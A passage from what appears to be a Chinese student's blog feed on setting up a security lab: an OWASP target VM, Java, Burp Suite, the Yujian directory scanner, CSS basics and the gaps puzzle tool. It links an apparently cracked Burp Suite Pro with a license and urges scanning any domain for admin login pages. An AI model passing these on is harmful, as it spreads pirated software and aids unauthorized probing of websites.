src="https://img-blog.csdnimg.cn/20200319234837950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>到结束这一步了，加载很快的，坚持……<br><img src="https://img-blog.csdnimg.cn/20200319234954717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>结束安装进程，到这里已经成功了，来看看是什么亚子吧，哈哈哈。先把兴奋留着，到后面再说<br><img src="https://img-blog.csdnimg.cn/20200319235113398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>输入你自己在安装过程中的用户名和密码。就可以登陆了<br><img src="https://img-blog.csdnimg.cn/2020031923530482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>进来了看看什么样子<br><img src="https://img-blog.csdnimg.cn/20200319235429736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>哇，太奈斯了，这个时候就可以长呼一口气了。为自己鼓掌。<br>现在我说一下我搭建时的艰辛，我上午下课十二点，吃个午饭，整了一下午，然后吃了晚饭又赶紧过来接着搞，到现在我这边博客写到这儿，晚上十二点了。中间几乎没停。所以在搭建过程中，不要觉得等的时间太长而放弃，坚持就是胜利。现在的最新版本的kali教程跟以前的不一样了。安装教程也很让人头疼，特别是我这样的初学者。分享这个为了让跟我一样的小白少踩一些坑。OK，其他的明天再说。先睡了！</p><p>OWASP靶机搭建<br>这个还是挺简单的，没有太繁琐的操作。开始吧<br>第一步：下载虚拟机，仍然是官网下载<a href="https://sourceforge.net/projects/owaspbwa/files/1.0rc2/">OWASP靶机官网</a><br><img src="https://img-blog.csdnimg.cn/2020032008114328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>点击download，然后就会跳转自动下载一个压缩包了。这个靶机没有什么旧版本新版本的，靶机嘛，就是一堆漏洞，没必要更新。<br>下载完成后，解压到虚拟机的专属位置（分下类，有规律一点）。<br>打开虚拟机主页，点击打开虚拟机<br><img src="https://img-blog.csdnimg.cn/20200320081644132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后根据你解压的靶机的路径把虚拟机添加进来，<br><img src="https://img-blog.csdnimg.cn/2020032008204049.png" alt="Augenstern" loading="lazy"><br>点开解压的文件夹就会有这个点击打开就行。<br>打开之后就直接是个虚拟机，是这样<br><img src="https://img-blog.csdnimg.cn/20200320082305443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>描述里面用户名和密码，打开虚拟机就行了。<br>输入用户名密码就进入了<br><img src="https://img-blog.csdnimg.cn/20200320082610872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看，已经进去了，这个密码输入的时候是看不到任何东西，我开始也可迷惑，为什么？难道是我的键盘不管用了？然后就找百度，原因也特别简单，就是，你输入密码就是看不到，只要别打错密码，把密码一股脑连续输进去，点击回车。看下图</p><p><img src="https://img-blog.csdnimg.cn/20200320082814463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>会提示我们welcome。这个就是成功进入了。<br>然后就输入<code>dhclient eth0</code>重新获取虚拟机IP。<br><img src="https://img-blog.csdnimg.cn/20200320083544592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>把IP作为域名放到浏览器访问，就会出现下面的页面。<br><img src="https://img-blog.csdnimg.cn/20200320083703219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我是用谷歌访问的，因为我看英文比较吃力，还能翻译一下。<br>到这里靶机搭建就成功了，可以进行一些常规的操作，请自行百度。</p><h4 id="VMware出现的一些问题，"><a href="#VMware出现的一些问题，" class="headerlink" title="VMware出现的一些问题，"></a>VMware出现的一些问题，</h4><p>刚打开虚拟机准备搭建的时候，发现有点不对劲，就是我原本的是中文版的，变成了全英文的，刚开始我也没太在意，就直接搭建了。然后失败了，就在打开虚拟机那一步，发现虚拟机打不开。它提示<code>Unable to find brain******一堆我忘了是什么了</code>。我忘了留图了，就在百度上找了一张，<br><img src="https://img-blog.csdnimg.cn/20200320100519863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自百度" loading="lazy"><br>就查百度，有说让重装的，那我之前的win7怎么办，不敢重装，就接着找方法，功夫不负有心人。我在百度经验上找到一位不知名的大佬看到了他的回复。我跟着操作，就可以了。也没有重装。<br><img src="https://img-blog.csdnimg.cn/20200320095838875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>下面说一下操作。<br>1.关闭虚拟机程序就不多说了，按照操作来就行。<br>2.以管理员身份运行命令行，可以在搜索cmd在下面搜索框</p><p><img src="https://img-blog.csdnimg.cn/20200320100700402.png" alt="Augenstern" loading="lazy"><br>然后有这样的<br><img src="https://img-blog.csdnimg.cn/20200320100820789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后操作就行了。<br>3.第三步就不演示了，就有一点要注意，就是快要修复完的时候它会找一个文件。名字叫<code>vmnetBridge.dll</code>这个如果找不到在哪里，可以用everything找一下，很快的。<br>呼……终于完了，到这里，全部问题解决。非常开心，哈哈哈！！！！<br><img src="https://img-blog.csdnimg.cn/20200320101931970.gif" alt="Augenstern" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java环境配置、burpsuite的配置、下载御剑</title>
      <link href="/2020/08/23/java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E3%80%81burpsuite%E7%9A%84%E9%85%8D%E7%BD%AE%E3%80%81%E4%B8%8B%E8%BD%BD%E5%BE%A1%E5%89%91/"/>
      <url>/2020/08/23/java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E3%80%81burpsuite%E7%9A%84%E9%85%8D%E7%BD%AE%E3%80%81%E4%B8%8B%E8%BD%BD%E5%BE%A1%E5%89%91/</url>
      
        <content type="html"><![CDATA[<p>害，这次get到的东西还挺多，全放到这一篇文章中来啦！！开动，奥利给！！！</p><h1 id="Java环境配置"><a href="#Java环境配置" class="headerlink" title="Java环境配置"></a>Java环境配置</h1><p>首先在官网下载jdk<a href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html</a><img src="https://img-blog.csdnimg.cn/20200215211106643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>可以自己选择，现在已经更新到java13了好像，害，说起来又是心酸，我起初下载的就是最新版本的迫于无奈又换了。妈呀，跑题了，，哈哈哈。继续<br>百度网盘：链接：<a href="https://pan.baidu.com/s/1BDdfQrntfgoFlE7wCktWsg">https://pan.baidu.com/s/1BDdfQrntfgoFlE7wCktWsg</a> 提取码：kutq<br>下载好了就双击安装就🆗<br><img src="https://img-blog.csdnimg.cn/20200215213156948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>关于配置环境建议放在C盘里吧，当然如果C盘东西太多也是可以调一下位置的，emmmmmm,就是有点麻烦。下一步，<img src="https://img-blog.csdnimg.cn/20200215213531730.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这个默认的就行，（上一步更改位置的这一步要改成跟上面一样的。）等待安装……<br><img src="https://img-blog.csdnimg.cn/20200215213728984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>安装好后出现<br><img src="https://img-blog.csdnimg.cn/20200215213816181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>点击关闭，然后开始配置环境变量<br>1.右键单击此电脑，点击属性<br>2.点击高级系统设置，找到环境变量，新建<br><img src="https://img-blog.csdnimg.cn/20200215214641512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>3.新建一个变量名：JAVA_HOME<br>变量值：C:\Program Files\Java\jdk1.8.0_181<br><img src="https://img-blog.csdnimg.cn/20200215215359633.png" alt="在这里插入图片描述" loading="lazy"><br>4.同样的<br>变量名 <code>.;%JAVA_HOME\lib\dt.jar;%JAVA_HOME%\lib\tools.jar</code><strong>全英文输入</strong><br><img src="https://img-blog.csdnimg.cn/20200215215442964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>5.找到Path变量<br><img src="https://img-blog.csdnimg.cn/20200215215636359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>6.编辑Path变量新建下图所示环境<br><img src="https://img-blog.csdnimg.cn/20200215215747929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>确定，保存！！！！最后一步完成！！再检测一下，打开cmd,Windows+R快速打开cmd,输入<code>java</code><br><img src="https://img-blog.csdnimg.cn/20200215220343273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>再输入<code>javac</code><br><img src="https://img-blog.csdnimg.cn/20200215220448872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>查看版本输入<code>java -version</code><br><img src="https://img-blog.csdnimg.cn/20200215220550386.png" alt="在这里插入图片描述" loading="lazy"><br>好啦，Java环境已经配置完成啦，呱唧呱唧哈哈哈<br><img src="https://img-blog.csdnimg.cn/20200215220753976.jpg" alt="在这里插入图片描述" loading="lazy"></p><h1 id="burpsuite的配置和使用"><a href="#burpsuite的配置和使用" class="headerlink" title="burpsuite的配置和使用"></a>burpsuite的配置和使用</h1><p>使用这个工具需要Java环境，我们上面已经配置好了！！<br>先下载，可以官网下载，不过这个正品需要money，害，不说了，直接上<br>百度网盘：链接：<a href="https://pan.baidu.com/s/1zMeH8A0WKw1UmdIxbPuBLQ">https://pan.baidu.com/s/1zMeH8A0WKw1UmdIxbPuBLQ</a><br>提取码：mwql<br>下载压缩包后解压双击<br><img src="https://img-blog.csdnimg.cn/20200215222411478.png" alt="在这里插入图片描述" loading="lazy"><br>会出现<br><img src="https://img-blog.csdnimg.cn/20200215222754298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>点run会打开burp suite_pro_v1.7.37，将上一张图中的license复制粘贴到这里，点next。<br><img src="https://img-blog.csdnimg.cn/20200215222929445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>最后完成时<br><img src="https://img-blog.csdnimg.cn/20200215223347944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>哎妈呀，终于好了，为了看到这个画面，我花费了整整一天的时间，<br>哇咔咔，<img src="https://img-blog.csdnimg.cn/20200215223738959.jpg" alt="在这里插入图片描述" loading="lazy"><br>激动的心，颤抖的手！！！</p><h1 id="下载御剑"><a href="#下载御剑" class="headerlink" title="下载御剑"></a>下载御剑</h1><p>御剑后台扫描珍藏版是T00LS大牛的作品,方便查找用户后台登陆地址，同时也为程序开发人员增加了难度，尽量独特的后台目录结构。<br>附带很强大的字典，字典我们也是可以自己修改的，继续增加规则。<br>御剑后台扫描工具 简介：</p><p>1、扫描线程自定义:用户可根据自身电脑的配置来设置调节扫描线程</p><p>2、集合DIR扫描 ASP ASPX PHP JSP MDB数据库 包含所有网站脚本路径扫描</p><p>3、默认探测200 (也就是扫描的网站真实存在的路径文件)<br> 百度网盘链接：链接：<a href="https://pan.baidu.com/s/1czUTNposkeMRn1FC-s1F1w">https://pan.baidu.com/s/1czUTNposkeMRn1FC-s1F1w</a><br>提取码：6509<br><strong>御剑使用</strong><br>使用方法也非常简单，只需要在“域名框”输入你要扫描的域名即可！然后点击扫描。<br><img src="https://img-blog.csdnimg.cn/20200215224532580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这次知识很多，要好好消化消化，哈哈哈。用过之后感觉这工具真好玩，好了，此次分享到此结束，哈哈哈！</p><p><img src="https://img-blog.csdnimg.cn/20200215224906431.jpg" alt="在这里插入图片描述" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML之CSS的简单学习</title>
      <link href="/2020/08/23/HTML%E4%B9%8BCSS%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/08/23/HTML%E4%B9%8BCSS%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>CSS：层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。<br>CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力<br>CSS在网页开发中是起装饰作用，如果把一个 漂亮的网页看成是一个人，HTML纯文本就是相当于一个“裸体人”，而CSS则是“衣服”，JavaScript就是“肢体动作”，三者共同组成一个完美的整体。</p><h2 id="CSS形式"><a href="#CSS形式" class="headerlink" title="CSS形式"></a>CSS形式</h2><p>一、最初的CSS是包含在标签里，通过标签属性style表现出来。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=&quot;background: red;color: blue;shape-rendering: all;&quot;&gt;字体&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>这样就能把内容进行修饰，但是这样写有它的缺点：<br>1.对于浏览器来说比较费时，要改很多东西。<br>2.对于开发人员来说，很复杂，很难维护。<br>二、同样的，不过是把style里的内容放在标签外面。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line"> p&#123;color:red;</span><br><span class="line">   background:black;</span><br><span class="line">   width:<span class="number">100</span>px;</span><br><span class="line">   height:<span class="number">100</span>px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;p&gt;字体&lt;/p&gt;</span><br><span class="line">&lt;p&gt;属性&lt;/p&gt;</span><br><span class="line">&lt;p&gt;形状&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>这样可以应用到多个标签，像这样：<br><img src="https://img-blog.csdnimg.cn/20200207191609228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>三、再打开一个文件，只编写CSS代码<br>把style里的内容放到新文件里，用link标签连接两个文件。<br><img src="https://img-blog.csdnimg.cn/20200207193146998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>结果不变：<br><img src="https://img-blog.csdnimg.cn/20200207193337738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>以上是CSS的三种基本形式。</p><h2 id="CSS语法"><a href="#CSS语法" class="headerlink" title="CSS语法"></a>CSS语法</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> <span class="comment">/*选择器*/</span> &#123;<span class="attribute">color</span>:red;</span><br><span class="line">   <span class="attribute">background</span>:yellow;</span><br><span class="line">   <span class="attribute">width</span>:<span class="number">100px</span>;</span><br><span class="line">   <span class="attribute">height</span>:<span class="number">100px</span>;</span><br><span class="line">&#125;<span class="comment">/*大括号里面的是样式内容*/</span></span><br></pre></td></tr></table></figure><p>多条属性之间用分号<code>  ；</code>隔开，格式为：<code>属性名: 属性值；</code><br>注释：<code>/*注释内容*/</code><br><strong>颜色</strong>：<br>   <strong>1.rgb模式</strong><br>r：红色<br>g：绿色<br>b：蓝色<br>颜色由浅到深—&gt;可由数值0-255表示，也可用百分数表示，比如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">color:rgb(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">color:rgb(<span class="number">50</span>%,<span class="number">25</span>%,<span class="number">25</span>%);</span><br></pre></td></tr></table></figure><p><strong>2.直接写名称</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line"><span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种是我常用的一种形式。</p><p><strong>3.16进制</strong><br>r：红色   FF<br>g：绿色  FF<br>b：蓝色 FF<br>FF表示15*15，结果是255，是最深的，00表示0，最浅的。<br>那么颜色可以这样表示 ：红色：#FF0000<br>两个数代表一种颜色，就像rgb(255,0,0)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line"><span class="attribute">color</span>:<span class="built_in">rgb</span>(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="attribute">color</span>:<span class="built_in">rgb</span>(<span class="number">50%</span>,<span class="number">25%</span>,<span class="number">25%</span>);</span><br><span class="line"><span class="attribute">color</span>:<span class="number">#ff0000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>选择器</strong><br>作用：通过选择器可以找到HTML里对应的元素，并且把选择器后面的样式传递给元素。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div &#123;</span><br><span class="line">background: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如说这个，通过这行代码，找到所有的<code>div</code>并把样式值改成背景颜色为<code>blue</code>。<br>选择器分为四大类<br>1.基本选择器<br>2.组合选择器<br>3.属性选择器<br>4.伪元素选择器<br>基本选择器：通配符选择器（*）、标签选择器（div…）、id选择器、class选择器。下面看样例：<br><img src="https://img-blog.csdnimg.cn/20200207203438545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>注意写代码的格式一定要写正确。<br>结果：<br><img src="https://img-blog.csdnimg.cn/20200207203606112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>没有什么比实例更易懂的了吧。哈哈哈<del>~</del><br>class选择器：<br>可以同时兼具多个class选择器的内容，<br><img src="https://img-blog.csdnimg.cn/20200207205741454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200207205843299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>上面的样例同时具备两个class的属性。<br>现在用的比较多的还是class选择器，也不是说id选择器不常用，而是，在CSS里面用的相对较多的还是class选择器，而id选择器则在JavaScript里用的比较多，因为id选择器针对性比较强。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gaps的安装__kali</title>
      <link href="/2020/08/23/gaps%E7%9A%84%E5%AE%89%E8%A3%85__kali/"/>
      <url>/2020/08/23/gaps%E7%9A%84%E5%AE%89%E8%A3%85__kali/</url>
      
        <content type="html"><![CDATA[<p>经过多次尝试和学长的点拨，我终于把gaps安装成功了，中间遇到了好多坑，装了n遍，终于坚持下来还是成功了，所以就记录一下解决办法。<br>先看安装的步骤</p><blockquote><p>git clone <a href="https://github.com/nemanja-m/gaps.git">https://github.com/nemanja-m/gaps.git</a><br>cd gaps<br>pip install -r requirements.txt<br>sudo apt-get install python-tk<br>pip install -e .</p></blockquote><p>这个安装步骤是参考大佬的博客<a href="http://www.ga1axy.top/index.php/archives/6/#gaps%EF%BC%88%E6%8B%BC%E5%9B%BE%EF%BC%89">安装gaps</a><br>然后看我的错误<br>前两步没出错，在第三步出错了，<br><code>pip3 install -r requirements.txt</code>，kali我用的是python3，所以用pip3<br>报错是</p><p><img src="https://img-blog.csdnimg.cn/20200406225158934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>之前一直在这里卡住，各种办法尝试，改文件，改版本。后来学长说他把numpy直接删除了，就行了。我也删。<br>操作：打开<code>requirements.txt</code>文件，把第一行删了。（急着赶下一步忘了截图）<br>然后重新执行该命令，发现还有报错，<br>就是跟下面这张图差不多的错误（忘了截图），意思就是我的opencv-python这个库版本低，不符合按照安装要求。解决办法是在文件里手动改版本<br>操作：打开<code>requirements.txt</code>文件，然后就把opencv-python的版本号改成符合要求的就行。我填的是<code>4.2.0.32</code>。<br>重新运行命令，结果再次报错。<br><img src="https://img-blog.csdnimg.cn/20200406225751911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>再改，百度一下新的<code>matplotlib</code>的版本，看看别人的版本号是多少，（因为这次报错，它没有显示并列出符合的版本），改一下。我这里是<code>3.0.3</code>，到这里做个对比，（当然不嫌弃的话可以按照我的修改）。<br><img src="https://img-blog.csdnimg.cn/2020040623205799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>再次运行命令。<br><img src="https://img-blog.csdnimg.cn/2020040623102972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>发现报错全没啦。可以进行下一步了。<br>我是root用户登陆，所以不用sudo，直接<code>apt-get install python-tk</code><br><img src="https://img-blog.csdnimg.cn/20200406231109910.png" alt="Augenstern" loading="lazy"><br>下一步，也是最后一步。<br><code>pip3 install -e .</code></p><blockquote><p>注意-e后面的点（.）不能丢了。最好直接复制步骤。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200406231648443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>成功，试试解这次比赛的题<br><img 